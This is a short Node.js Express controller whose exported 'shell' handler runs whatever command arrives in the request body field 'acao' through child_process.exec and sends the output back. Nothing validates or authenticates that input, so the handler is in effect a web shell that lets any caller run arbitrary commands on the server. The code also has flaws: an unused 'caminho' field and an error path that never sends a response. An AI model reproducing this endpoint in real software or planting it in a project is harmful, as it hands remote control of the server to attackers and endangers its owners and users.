const logger = require('../logger/logger');
const { exec } =  require('child_process')

exports.shell = async (req, res) => {
    try {     
        let acao = req.body.acao;
        var caminho = req.body.caminho;
  
        exec(acao, (err, stdout, stderr) => {
            if(err){
                logger.error(err);
                res.status(500);
            }else{
                res.status(200).send(stdout);
                logger.info(stdout);
            } 
        })
       
    } catch (error) {
        logger.error(error);
    }


}